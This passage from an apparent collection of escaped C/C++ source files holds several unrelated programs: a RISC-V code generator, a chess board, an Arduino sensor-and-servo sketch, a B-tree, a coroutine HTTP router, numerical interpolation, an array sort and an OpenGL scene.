\"t0\");\n    }\n    else\n    {\n        load_to_reg(kload->src, \"t0\");\n        store_to_stack(addr, \"t0\");\n    }\n}\n\nvoid RISCVBuilder::gen_riscv_value_store(const koopa_raw_store_t *kstore)\n{\n    output << endl;\n    \n    std::string dest;\n    if(kstore->dest->kind.tag == KOOPA_RVT_GLOBAL_ALLOC)\n    {\n        output << \"\\tla t1, \" << kstore->dest->name + 1 << endl;\n        dest = \"0(t1)\";\n    }\n    else if(kstore->dest->kind.tag == KOOPA_RVT_GET_ELEM_PTR || kstore->dest->kind.tag == KOOPA_RVT_GET_PTR)\n    {\n        load_to_reg(kstore->dest, \"t1\");\n        dest = \"0(t1)\";\n    }\n    else\n    {\n        int addr = env.GetAddr(kstore->dest);\n        if(addr < -2048 || addr > 2047)\n        {\n            output << \"\\tli t1, \" << addr << endl;\n            output << \"\\tadd t1, t1, sp\" << endl;\n            dest = \"0(t1)\";\n        }\n        else\n            dest = std::to_string(addr) + \"(sp)\";\n    }\n    if(kstore->value->kind.tag == KOOPA_RVT_FUNC_ARG_REF)\n    {\n        if(kstore->value->kind.data.func_arg_ref.index < 8)\n            output << \"\\tsw a\" << kstore->value->kind.data.func_arg_ref.index << \", \" << dest << endl;\n        else\n        {\n            int offset = (kstore->value->kind.data.func_arg_ref.index - 8) * 4;\n            if(offset < -2048 || offset > 2047)\n            {\n                output << \"\\tli t2, \" << offset << endl;\n                output << \"\\taddi t2, t2, sp\" << endl;\n                output << \"\\tlw t0, 0(t2)\" << endl;\n            }\n            else\n                output << \"\\tlw t0, \" << offset << \"(sp)\" << endl;\n            output << \"\\tsw t0, \" << dest << endl;\n        }\n    }\n    else\n    {\n        load_to_reg(kstore->value, \"t0\");\n        output << \"\\tsw t0, \" << dest << endl;\n    }\n}\n\nvoid RISCVBuilder::gen_riscv_value_get_ptr(const koopa_raw_get_ptr_t *kget, int addr)\n{\n    output << endl;\n\n    int src_addr = env.GetAddr(kget->src);\n    if(src_addr > 2047 || src_addr < -2048)\n    {\n        output << \"\\tli t0, \" << src_addr << endl;\n        output << \"\\tadd t0, sp, t0\" << endl;\n    }\n    else\n        output << \"\\taddi t0, sp, \" << src_addr << endl;\n    output << \"\\tlw t0, 0(t0)\" << endl;\n\n    load_to_reg(kget->index, \"t1\");\n    int n = calc_type_size(kget->src->ty->data.pointer.base);\n    output << \"\\tli t2, \" << n << endl;\n    output << \"\\tmul t1, t1, t2\" << endl;\n    output << \"\\tadd t0, t0, t1\" << endl;\n    store_to_stack(addr, \"t0\");\n}\n\nvoid RISCVBuilder::gen_riscv_value_get_elem_ptr(const koopa_raw_get_elem_ptr_t *kget, int addr)\n{\n    output << endl;\n\n    if(kget->src->kind.t",
    "#include <QMessageBox>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n\n#include \"Board.h\"\n#include \"Piece.h\"\n\nBoard::Board(bool isPvP) : isPvP(isPvP) {\n\n    whiteKingMoved = false;\n    blackKingMoved = false;\n    whiteRookLeftMoved = false;\n    whiteRookRightMoved = false;\n    blackRookLeftMoved = false;\n    blackRookRightMoved = false;\n    game_over = false;\n\n    for (int i = 0; i < 8; ++i) {\n        for (int j = 0; j < 8; ++j) {\n            board[i][j] = nullptr;\n        }\n    }\n\n    board[0][0] = new Rook(false);\n    board[0][1] = new Knight(false);\n    board[0][2] = new Bishop(false);\n    board[0][3] = new Queen(false);\n    board[0][4] = new King(false);\n    board[0][5] = new Bishop(false);\n    board[0][6] = new Knight(false);\n    board[0][7] = new Rook(false);\n    for (int i = 0; i < 8; ++i) {\n        board[1][i] = new Pawn(false);\n    }\n\n    board[7][0] = new Rook(true);\n    board[7][1] = new Knight(true);\n    board[7][2] = new Bishop(true);\n    board[7][3] = new Queen(true);\n    board[7][4] = new King(true);\n    board[7][5] = new Bishop(true);\n    board[7][6] = new Knight(true);\n    board[7][7] = new Rook(true);\n    for (int i = 0; i < 8; ++i) {\n        board[6][i] = new Pawn(true);\n    }\n\n    isWhiteTurn = true;\n}\n\nPiece* Board::getPiece(int x, int y) {\n    return board[y][x];\n}\n\nvoid Board::setPiece(int x, int y, Piece* piece) {\n    board[y][x] = piece;\n}\n\nbool Board::movePiece(int startX, int startY, int endX, int endY) {\n    std::cout << \"Attempting to move piece from (\" << startX << \", \" << startY << \") to (\" << endX << \", \" << endY << \")\" << std::endl;\n\n    Piece* piece = getPiece(startX, startY);\n\n    if (piece == nullptr || piece->getIsWhite() != isWhiteTurn) {\n        std::cout << \"Invalid move: No piece at start or not the correct turn.\" << std::endl;\n        return false;\n    }\n\n    if (Pawn* pawn = dynamic_cast<Pawn*>(piece)) {\n        if (abs(startY - endY) == 1 && abs(startX - endX) == 1 && getPiece(endX, endY) == nullptr) {\n            Piece* capturedPawn = getPiece(endX, startY);\n            if (Pawn* capturedPawnCast = dynamic_cast<Pawn*>(capturedPawn)) {\n                if (capturedPawnCast->getJustDoubleJumped()) {\n                    setPiece(endX, startY, nullptr);\n                    setPiece(endX, endY, pawn);\n                    setPiece(startX, startY, nullptr);\n                    std::cout << \"En passant move: Captured pawn at (\" << endX << \", \" << startY << \")\" << std::endl;\n                    switchTurn();\n                    return true;\n                }\n            }\n        }\n    }\n\n    if (dynamic_cast<King*>(piece)) {\n        if (isWhiteTurn) {\n            if (startX == 4 && startY == 7 && endX == 6 && endY == 7) {\n                if (canCastle(true, true)) {\n                    setPiece(6, 7, piece);\n                    setPiece(4, 7, nullptr);\n                    setPiece(5, 7, getPiece(7, 7));\n                    setPiece(7, 7, nullptr);\n                    whiteKingMoved = true;\n                    whiteRookRightMoved = true;\n                    switchTurn();\n                    return true;\n                } else {\n                    return false;\n                }\n            } else if (startX == 4 && startY == 7 && endX == 2 && endY == 7) {\n                if (canCastle(true, false)) {\n                    setPiece(2, 7, piece);\n                    setPiece(4, 7, nullptr);\n                    setPiece(3, 7, getPiece(0, 7));\n                    setPiece(0, 7, nullptr);\n                    whiteKingMoved = true;\n                    whiteRookLeftMoved = true;\n                    switchTurn();\n                    return true;\n                } else {\n                    return false;\n                }\n            }\n        } else {\n            if (startX == 4 && startY == 0 && endX == 6 && endY == 0) { // Roszada kr\u00f3tka\n                if (canCastle(false, true)) {\n                    setPiece(6, 0, piece);\n                    setPiece(4, 0, nullptr);\n                    setPiece(5, 0, getPiece(7, 0));\n                    setPiece(7, 0, nullptr);\n                    blackKingMoved = true;\n                    blackRookRightMoved = true;\n                    switchTurn();\n                    return true;\n                } else {\n                    return false;\n                }\n            } else if (startX == 4 && startY == 0 && endX == 2 && endY == 0) { // Roszada d\u0142uga\n                if (canCastle(false, false)) {\n                    setPiece(2, 0, piece);\n                    setPiece(4, 0, nullptr);\n                    setPiece(3, 0, getPiece(0, 0));\n                    setPiece(0, 0, nullptr);\n                    blackKingMoved = true;\n                    blackRookLeftMoved = true;\n                    switchTurn();\n                    return true;\n                } else {\n                    return false;\n                }\n            }\n        }\n    }\n\n    if (!piece->isValidMove(*this, startX, startY, endX, endY)) {\n        std::cout << \"Invali",
    "#include <Arduino.h>\n#include \"libreria.h\"\n\n// Inicializaci\u00f3n de objetos y variables\nServo myServo;                   // Crea un objeto Servo\nDHT dht(DHT_PIN, DHT_TYPE);      // Inicializa el objeto DHT con el pin y tipo definidos\nint pote = 0;\nint gasValue = 0;                // Variable para almacenar la lectura del sensor MQ2                    // Variable para almacenar el valor discretizado del potenci\u00f3metro\nint histeresis = 5;\nvoid setup() {\n    Serial.begin(9600);          // Inicia la comunicaci\u00f3n serial a 9600 bps\n    setupPins();                 // Configura los pines\n    dht.begin();                 // Inicia la comunicaci\u00f3n con el sensor DHT\n}\n\nvoid loop() {\n    readPotentiometer();         // Lee el valor del potenci\u00f3metro\n    readDHTSensor();             // Lee los valores del sensor DHT\n    readPhotoresistor();         // Lee el valor del fotorresistor\n    readMQ2Sensor();             // Lee el valor del sensor MQ2\n    controlServo();              // Controla el servo motor basado en las lecturas de los sensores\n    delay(2000);                 // Espera 2 segundos antes de la siguiente iteraci\u00f3n del loop\n}\n\nvoid setupPins() {\n    myServo.attach(SERVO_PIN);   // Asigna el pin del servo al objeto Servo\n}\n\nvoid readPotentiometer() {\n    int potValue = analogRead(POT_PIN);       // Lee el valor anal\u00f3gico del potenci\u00f3metro\n    pote = map(potValue, 0, 1023, 0, 36);     // Mapea el valor de 0-1023 a 0-36\n    Serial.print(\"Potenciometro: \");          // Imprime el valor del potenci\u00f3metro en el monitor serial\n    Serial.println(pote);\n}\n\nvoid readDHTSensor() {\n    float h = dht.readHumidity();             // Lee la humedad del sensor DHT\n    float t = dht.readTemperature();          // Lee la temperatura del sensor DHT\n\n    // Verifica si alguna lectura fall\u00f3 y, de ser as\u00ed, imprime un mensaje de error\n    if (isnan(h) || isnan(t)) {\n        Serial.println(F(\"Error al leer del sensor DHT!\"));\n        return;\n    }\n\n    // Imprime las lecturas de humedad y temperatura en el monitor serial\n    Serial.print(F(\"Humedad: \"));\n    Serial.print(h);\n    Serial.print(F(\"%  Temperatura: \"));\n    Serial.print(t);\n    Serial.println(F(\"\u00b0C \"));\n}\n\nvoid readPhotoresistor() {\n    int photoValue = analogRead(PHOTORESISTOR_PIN);    // Lee el valor anal\u00f3gico del fotorresistor\n    Serial.print(\"Fotoresistor: \");                    // Imprime el valor del fotorresistor en el monitor serial\n    Serial.println(photoValue);\n}\n\nvoid readMQ2Sensor() {\n    gasValue = analogRead(MQ2_PIN);                    // Lee el valor anal\u00f3gico del sensor MQ2\n    Serial.print(\"MQ2 Gas Sensor: \");                  // Imprime el valor del sensor MQ2 en el monitor serial\n    Serial.println(gasValue);\n}\n\nvoid controlServo() {\n    int photoValue = analogRead(PHOTORESISTOR_PIN);    // Lee el valor del fotorresistor\n    float temperature = dht.readTemperature();         // Lee la temperatura del sensor DHT\n\n    delay(1000);\n    if (gasValue < (430 + histeresis)) \n    {\n      \n        if ((photoValue < (300 + histeresis)) && (temperature > pote)) {// mayor a 300 es de noche\n            myServo.write(90);\n                Serial.println(\"Temperatura > pote, Servo a 90 grados.\");\n                Serial.println(\"ESTA DE DIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");\n                delay(1000);\n        }\n        else if (gasValue < (430 - histeresis) ){\n            myServo.write(0);\n            Serial.println(\"cierro!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\");\n            delay(1000);\n        }\n        \n    }\n    else{\n        myServo.write(90);\n        Serial.println(\"hay GAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS\");\n        delay(1000);\n    }\n}\n",
    "#include \"btree.hpp\"\n#include <cstring>\n#include <iostream>\n\n\n\nbtree::btree(){\n\troot = new page(LEAF);\n\theight = 1;\n};\n\nvoid btree::insert(char *key, uint64_t val){\n\t// Please implement this function in project 3.\n\tpage* stack[1000];\n\tint top=-1;\n\tpage* C = root;\n\twhile (C->get_type() == INTERNAL) {\n\t\tchar* split_key = nullptr;\n\t\ttop++;\n\t\tstack[top] = C;\n\t\tC = (page *)C->find(key);\n\n\t}\n\n\tif(!C->is_full(strlen(key) + 1 + sizeof(val) + sizeof(uint16_t))) {\n\t\tC->insert(key, val);//\ube48\uacf5\uac04 \uc788\uc73c\uba74 \uadf8\ub0e5 \uc0bd\uc785\n\t}else {\n\t\t//\uac00\ub4dd\ucc28\uc11c \uc0c8\ub85c\uc6b4 node\uac00 \ud544\uc694\n\t\tchar* new_parent_key = nullptr;\n\t\tpage* new_leaf = C->split(key, val, &new_parent_key);\n\n\t\tif(C == root) {\n\t\t\t//split \ud574\uc57c\ud558\ub294\uac8c root\uc77c\ub54c \uc0c8\ub85c\uc6b4 root \ud544\uc694\n\t\t\tpage* new_root = new page(INTERNAL);\n\t\t\tnew_root->insert(new_parent_key, (uint64_t)new_leaf);\n\t\t\tnew_root->set_leftmost_ptr(C);\n\t\t\troot = new_root;\n\t\t\theight++;\n\t\t}else {\n\t\t\tpage* parent = stack[top];\n\t\t\tparent->insert(new_parent_key, (uint64_t)new_leaf);\n\t\t\ttop--;\n\t\t}\n\t}\n}\n\nuint64_t btree::lookup(char *key){\n\t// Please implement this function in project 3.\n\n\tpage* C = root;\n\twhile (C->get_type() == INTERNAL) {\n\t\tC = (page *)C->find(key);\n\t}\n\n\treturn C->find(key);\n}\n\n\n\n// uint16_t record_size = 0;\n//\n// void *stored_key = nullptr;\n// uint64_t stored_val = 0;\n//\n// printf(\"## slot header\\n\");\n// printf(\"Number of data :%d\\n\", num_data);\n// printf(\"offset_array : |\");\n//\n// printf(\"\\n\");",
    "\ufeff#include \"includes.h\"\n#include \"defs.h\"\n#include \"url_router.h\"\n#include \"server.h\"\n\nget_endpoint<\"/hello\"> \nhello(asio::io_context *ctx, request *req) { \n\tboost::asio::system_timer wait{ *ctx, 500ms };\n\tco_await wait.async_wait(use_awaitable);\n\tauto agent{ (*req)[http::field::user_agent] };\n\tco_return response{ http::status::ok, 11, std::format(\"ahoj, {}\\n\", std::string_view{ agent.begin(), agent.end() }) };\n}\n\nget_endpoint<\"/hello2\"> \nhello2(reroute_t reroute) { \n\tco_return co_await reroute(\"/hello\");\n}\n\nget_endpoint<\"/div/<a>/<b>\"> \ndivide(path_arg<\"b\", uint32_t> b, path_arg<\"a\", uint32_t> a, query_arg<\"x\", uint32_t> x)\n{\n\tif (!b)\n\t\tco_return response{ http::status::bad_request, 11, \"to nejde\\n\" };\n\n\tauto d{ a / b };\n\tauto r{ a - d * b };\n\tco_return response{ http::status::ok, 11, std::format(\"x = {}\\n {}, zbytek {}\\n\", x.value, d, r) };\n}\n\nany_endpoint<\"*\"> \nnot_found() \n{ \n\tco_return response{ http::status::not_found, 11, \"nemame, nevedeme\\n\" }; \n}\n\nget_endpoint<\"/api/aa\">\napi_aa(reroute_t reroute) {\n\tco_return co_await reroute(\"/hello\");\n}\n\nrouter_t<&api_aa, &not_found> subrouter;\n\nget_endpoint<\"/api/*\"> \napi(asio::io_context *ctx, request *req, reroute_t reroute) {\n\tco_return co_await subrouter.route(*req, ctx, reroute);\n}\n\nv2::async_endpoint<verbs::get, \"/api/*/x/**/div/<a>/<b>\", response>\ntest_v2(path_arg<\"a\", uint32_t> a, path_arg<\"b\", std::string_view> b)\n{\n\tco_return response{ http::status::not_found, 11, \"nemame, nevedeme\\n\" }; \n}\n\nint main()\n{\n\tusing test_route = v2::detail::route_descriptor<&test_v2>;\n\tstd::string_view path_regex{ test_route::path_regex.str.begin(), test_route::path_regex.str.end() };\n\tstd::println(\"{}\", path_regex);\n\tstd::println(\"{}\", typeid(test_route::endpoint_type::argument_pattern_tuple).name());\n//\tstd::println(\"{}\", test_route::capture_group_count);\n\n\tboost::asio::io_context ctx;\n\tsimple_http_server<&hello, &divide, &api, &not_found> srvr{ ctx, 3454 };\n\n\tstd::jthread t{ [&] {ctx.run(); } };\n\t(void)getchar();\n\tctx.stop();\n\n\treturn 0;\n}\n",
    "#include \"interp.h\"\n\nMatrix solve_LU(Matrix& A, Matrix& b){\n\tASSERT(A.getRows() == A.getCols(), \"Matrix A must be square\\n\");\n\tASSERT(A.getRows() == b.getRows(), \"Matrix A and b must have the same number of rows\\n\");\n\tASSERT(b.getCols() == 1, \"Matrix b must have only one column\\n\");\n\tint N = A.getRows();\n\tLU lu = A.decomposeLU();\n\n\tMatrix y(N);\n\tMatrix x(N);\n\n\tfor(int i = 0; i<N; i++){\n\t\tdouble sum = 0;\n\t\tfor(int j = 0; j<i; j++){\n\t\t\tsum += lu.L->getElement(i,j)*y.getElement(j);\n\t\t}\n\t\ty.setElement(i,0,(b.getElement(i)-sum)/lu.L->getElement(i,i));\n\t}\n\n\tfor(int i = N-1; i>=0; i--){\n\t\tdouble sum = 0;\n\t\tfor(int j = i+1; j<N; j++){\n\t\t\tsum += lu.U->getElement(i,j)*x.getElement(j);\n\t\t}\n\t\tx.setElement(i,0,(y.getElement(i)-sum)/lu.U->getElement(i,i));\n\t}\n\n\tMatrix error_vec = (A*x) - b;\n\tdouble error = 0;\n\tfor (int i = 0; i < N; i++){\n\t\terror += error_vec.getElement(i) * error_vec.getElement(i);\n\t}\n\terror = sqrt(error);\n\tdelete lu.L;\n\tdelete lu.U;\n\treturn x;\n}\n\nvector<long double> interp_lagrange(vector<point> selected_points, vector<point> x_interp)\n{\n\tvector<long double> y_interp;\n\tint N = x_interp.size();\n\tint n = selected_points.size();\n\tfor (int i = 0; i < N; i++)\n\t{\n\t\tlong double x = x_interp[i].x;\n\t\tlong double y = 0;\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tlong double L = 1;\n\t\t\tfor (int k = 0; k < n; k++)\n\t\t\t{\n\t\t\t\tif (k != j)\n\t\t\t\t{\n\t\t\t\t\tL *= (x - selected_points[k].x) / (selected_points[j].x - selected_points[k].x);\n\t\t\t\t}\n\t\t\t}\n\t\t\ty += selected_points[j].y * L;\n\t\t}\n\t\ty_interp.push_back(y);\n\t}\n\treturn y_interp;\n}\n\nvector<long double> interp_cubic_spline(vector<point> selected_points, vector<point> x_interp)\n{\n\tint subintervals = selected_points.size() - 1;\n\tint n = 4 * (subintervals);\n\tMatrix A(n, n);\n\tMatrix b(n);\n\tint row = 0;\n\tfor (int i = 0; i<subintervals; i++){\n\t\tA.setElement(row, 4*i, 1);\n\t\tb.setElement(row, 0, selected_points[i].y);\n\t\trow++;\n\t\tint h = selected_points[i+1].x - selected_points[i].x;\n\t\tA.setElement(row, 4*i, 1);\n\t\tA.setElement(row, 4*i+1, h);\n\t\tA.setElement(row, 4*i+2, pow(h,2));\n\t\tA.setElement(row, 4*i+3, pow(h,3));\n\t\tb.setElement(row, 0, selected_points[i+1].y);\n\t\trow++;\n\n\t\tif(i<subintervals-1){\n\t\t\tA.setElement(row, 4*i+1, 1);\n\t\t\tA.setElement(row, 4*i+2, 2*h);\n\t\t\tA.setElement(row, 4*i+3, 3*pow(h,2));\n\t\t\tA.setElement(row,(i+1)*4+1, -1);\n\t\t\trow++;\n\n\t\t\tA.setElement(row, 4*i+2, 2);\n\t\t\tA.setElement(row, 4*i+3, 6*h);\n\t\t\tA.setElement(row,(i+1)*4+2, -2);\n\t\t\trow++;\n\t\t}\n\n\t}\n\tA.setElement(row, 2, 1);\n\trow++;\n\tA.setElement(row, n-2, 2);\n\tA.setElement(row, n-1, 6*(selected_points[subintervals].x-selected_points[subintervals-1].x));\n\trow++;\n\tMatrix c = solve_LU(A, b);\n\tvector<long double> y_interp;\n\tfor(int i = 0; i<x_interp.size(); i++){\n\t\tprintf(\"%Lf\\n\", x_interp[i].x);\n\t\tbool found = false;\n\t\tfor(int j = 0; j<selected_points.size()-1; j++){\n\t\t\tif(x_interp[i].x>=selected_points[j].x && x_interp[i].x<=selected_points[j+1].x){\n\t\t\t\tlong double h = x_interp[i].x - selected_points[j].x;\n\t\t\t\tlong double y = c.getElement(4*j) + c.getElement(4*j+1)*h + c.getElement(4*j+2)*pow(h,2) + c.getElement(4*j+3)*pow(h,3);\n\t\t\t\ty_interp.push_back(y);\n\t\t\t\tprintf(\"%Lf %Lf\\n\", x_interp[i].x, y);\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif(!found){\n\t\t\tprintf(\"%Lf not found\\n\", x_interp[i].x);\n\t\t\ty_interp.push_back(y_interp[y_interp.size()-1]);\n\t\t}\n\t}\n\treturn y_interp;\n}\n\nvector<point> get_points_linspace(vector<point> x, int count){\n\tvector<point> x_interp;\n\tlong double x_min = x[0].x;\n\tlong double x_max = x[x.size()-1].x;\n\tlong double dx = (x_max-x_min)/(count-1);\n\tfor(int i = 0; i<count; i++){\n\t\tlong double x_interp_i = x_min + i*dx;\n\t\tint j = 0;\n\t\twhile(j<x.size()-1 && x_interp_i>x[j+1].x){\n\t\t\tj++;\n\t\t}\n\t\tx_interp_i = x[j].x;\n\t\tlong double y_interp_i = x[j].y;\n\t\tx_interp.push_back({x_interp_i, y_interp_i});\n\t}\n\treturn x_interp;\n}\n\nvector<point> get_points_chebyshev(vector<point> x, int count)\n{\n\tvector<point> x_interp;\n\tlong double x_min = x[0].x;\n\tlong double x_max = x[x.size() - 1].x;\n\tfor (int i = 0; i < count; i++)\n\t{\n\t\tlong double x_interp_i = (x_min + x_max) / 2 + (x_max - x_min) / 2 * cos((2 * i + 1) * M_PI / (2 * count));\n\t\tint j = 0;\n\t\twhile (j < x.size() - 1 && x_interp_i > x[j + 1].x)\n\t\t{\n\t\t\tj++;\n\t\t}\n\t\tx_interp_i = x[j].x;\n\t\tlong double y_interp_i = x[j].y;\n\t\tx_interp.push_back({x_interp_i, y_interp_i});\n\t}\n\treturn x_interp;\n}\n",
    "#include <bits/stdc++.h>\n#include \"utilities.cpp\"\n\nusing namespace std;\n\nint main()\n{\n    vector<int> arr{2, 1, 1, 0, 2, 0, 1, 0, 1, 0, 2, 1, 0, 1, 1, 2, 1, 2, 1, 0, 2, 0, 2, 2, 0, 1, 1, 1, 0, 2, 2, 1, 0, 0, 1, 2, 0, 1, 2, 1, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 2, 1, 2, 0, 0, 2, 2, 1, 2, 1, 2, 2, 1, 1, 0, 0, 1, 2, 2, 1, 2, 1, 0, 1, 2, 1, 1, 1, 2, 2, 2, 0, 2, 0, 1, 2, 1, 1, 0, 0, 0, 2, 2, 1, 2, 0, 1, 1, 2, 0, 0, 0, 1, 0, 2, 0, 0, 2, 1, 1, 0, 0, 0, 2, 1, 0, 1, 2, 1, 1, 2, 2, 2, 1, 1, 0, 2, 0, 0, 2, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 2, 2, 2, 0, 0, 0, 2, 1, 0, 0, 2, 1, 1, 0, 1, 1, 2, 2, 2, 1, 2, 1, 0, 1, 0, 1, 2, 1, 2, 2, 1, 2, 1, 0, 2, 0, 1, 1, 2, 0, 2, 2, 0, 1, 1, 2, 0, 2, 0, 2, 0, 1, 2, 0, 1, 2, 2, 0, 1, 0, 2, 2, 1, 1, 2, 1, 1, 1, 2, 0, 2, 0, 2, 2, 0, 1, 2, 2, 2, 2, 1, 2, 0, 1, 2, 0, 0, 2, 2, 1, 2, 0, 2, 1, 1, 0, 1, 2, 1, 0, 2, 0, 1, 1, 2, 0, 0, 2, 0, 2, 1, 2, 2, 1, 2, 1, 1, 0, 1, 1, 1, 0, 1, 1, 2, 0, 2, 2, 2, 2, 2, 1, 2, 1, 0, 0, 2, 0, 0, 2, 1, 0, 2, 2, 0, 1, 2, 1, 2, 2, 1, 1, 0, 2, 2, 1, 0, 2, 2, 2, 1, 1, 1, 0};\n    int s = arr.size();\n\n    int i = 0, j = s - 1, k = s - 1;\n\n    // i -> for zeroes position\n    // j -> will move for 2's position and swap for 0's\n    // position\n    // k -> will go to place where 2 should come.\n\n    while (i <= j)\n    {\n        while (arr[i] == 0)\n            i++;\n\n        if (i > j)\n            continue;\n\n        if (arr[j] == 2)\n        {\n            if (j == k)\n                j--;\n            else\n                swap(arr[j], arr[k]);\n            k--;\n        }\n\n        else if (arr[j] == 0)\n        {\n            swap(arr[i], arr[j]);\n            i++;\n        }\n\n        else\n            j--;\n    }\n\n    printVector(arr);\n\n    return 0;\n}\n",
    "\ufeff#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n#include \"shader.h\"\n#include \"camera.h\"\n#include \"plane.h\"\n#include \"cylinder.h\"\n#include \"pyramid.h\"\n#include \"stb_image.h\"\n\n//GLM Libs\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n#include <vector>\n#include <random>\n#include \"cube.h\"\n#include \"texture2d.h\"\n#include \"sphere.h\"\n\n//define PI\n#define M_PI 3.1415926535897932384626433832795\n\nusing namespace std;\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid processInput(GLFWwindow* window);\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos);\nvoid scroll_callback(GLFWwindow* window, double xOffset, double yOffset);\nvoid key_callback(GLFWwindow* window, int key, int scanCode, int action, int mods);\nvoid ToggleProjectionMatrix();\nglm::mat4  ResetModelView(float angle);\n\n// settings\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\n//Camera\nCamera camera(glm::vec3(0.0f, 1.0f, -3.0f)); //Default spawn location of the camera\n\nbool usePerspective = true;\nglm::mat4 projection; //Projection matrix\n\nbool useDirectionalLight = true;\nbool useFlashlight = false;\n\nfloat lastX = SCR_WIDTH / 2;\nfloat lastY = SCR_HEIGHT / 2;\nbool firstMouse = true;\n\n// Define a wobble parameters\n//float wobbleSpeed = 0.5f; // Adjust the speed of the wobble\n//float wobbleAmount = 30.0f; // Adjust the amount of wobble\n//float rotationSpeed = 10.0f; // Adjust the speed of rotation\n\n//FrameRate\nfloat deltaTime = 0.0f;\nfloat lastFrame = 0.0f;\n\nint main()\n{\n    // glfw: initialize and configure\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw window creation\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"My 3D Scene - Christopher Roelle\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    //Lock mouse to window and add a callback for mouse movement\n    glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n    glfwSetCursorPosCallback(window, mouse_callback);\n\n    //Scroll callback\n    glfwSetScrollCallback(window, scroll_callback);\n\n    //Key callback for single action buttons\n    glfwSetKeyCallback(window, key_callback);\n\n    // glad: load all OpenGL function pointers\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n    //Enable depth testing (will stay on until we disable with) glDisable(GL_DEPTH_TEST);\n    glEnable(GL_DEPTH_TEST);\n\n    //TODO::SOME MESHES HAVE FLIPPED FACES, ENABLE BACK-FACE CULLING TO SEE THEM. NEED TO CORRECT THESE\n    //glEnable(GL_CULL_FACE);\n    //glCullFace(GL_BACK);\n\n    // build and compile our shader program\n    // ------------------------------------\n    Shader lightCubeSampleShader(\"shaderfiles/lightCubeVertex.glsl\", \"shaderfiles/lightCubeFragm.glsl\");\n    Shader multiLightShader(\"shaderfiles/sampleMultiLightVertex.glsl\", \"shaderfiles/sampleMultiLightFragm.glsl\");\n\n    //Texture stuff\n    //Generate and store textures (Default constructor: FilePath, hasAlphaChannel), Texture2D.Texture to return the texture data\n    Texture2D groundPlaneDiffuseTexture = Texture2D(\"textures/blackWood-diffuse.jpg\", false);\n    Texture2D groundPlaneSpecularTexture = Texture2D(\"textures/blackWood-specular.jpg\", false);\n\n    Texture2D ceramicDiffuseTexture = Texture2D(\"textures/ceramicJar-diffuse.jpg\", false);\n    Texture2D ceramicBlackDiffuseTexture = Texture2D(\"textures/ceramicJarBlack-diffuse.jpg\", false);\n    Texture2D ceramicSpecularTexture = Texture2D(\"textures/ceramicJar-specular.png\", true);\n\n    Texture2D waxDiffuseTexture = Texture2D(\"textures/wax-diffuse.jpg\", false);\n    Texture2D waxSpecularTexture = Texture2D(\"textures/wax-specular.jpg\", false);\n\n    Texture2D wickDiffuseTexture = Texture2D(\"textures/wick-diffuse.jpg\", false);\n    Texture2D wickSpecularTexture = Texture2D(\"textures/wick-specular.jpg\", false);\n\n    Texture2D candleLabelDiffuseTexture = Texture2D(\"textures/label-diffuse.png\", true, false, true, true, true); //Using Overload to turn off repeat of texture\n    Texture2D candleLabelSpecularTexture = Texture2D(\"textures/label-specular.png\", true, false, true, true, true); //Using Overload to turn off repeat of texture\n\n    Texture2D silverDiffuseTexture = Texture2D(\"textures/silver-diffuse.jpg\", false);\n    Texture2D silverSpecularTexture = Texture2D(\"textures/silver-specular.jpg\", false);\n    si",
    "#include \"textBox.h\"\n#include \"math/timemath.h\"\n#include \"application/interaction.h\"\n#include \"math/graphics/brush/font/baseFont.h\"\n#include \"math/graphics/graphicsFunctions.h\"\n\ntextBox::textBox(cbool &multiLine) : control(), multiLine(multiLine)\n{\n}\n\nvoid textBox::render(cveci2 &position, const texture &renderTarget)\n{\n\tcontrol::render(position, renderTarget);\n\n\t// draw cursor\n\tif (focused && GetSecond() % 2)\n\t{\n\t\tcheckCursorIndex();\n\t\trectangle2 textRect = rectangle2(position, rect.size).expanded(-borderSize);\n\t\tvec2 cursorPosition = currentFont->MeasureStringOffset(textRect, text.substr(0, cursorIndex));\n\t\tfillRectangle(renderTarget, crectangle2(cursorPosition, vec2(1, currentFont->fontSize)), brushes::white);\n\t}\n}\n\nvoid textBox::enterText(cuint &uniCode)\n{\n\tcheckCursorIndex();\n\tconst wchar_t& charEntered = (wchar_t)uniCode;\n\tconstexpr wchar_t pasteChar = L'\\x0016';\n\tconstexpr wchar_t copyChar = L'\\x0003';\n\tif (!is_in(charEntered, L'\\b', copyChar, pasteChar) &&\n\t\t(multiLine || !is_in((wchar_t)uniCode, L'\\n', L'\\r')))\n\t{\n\t\ttext.insert(cursorIndex, 1, 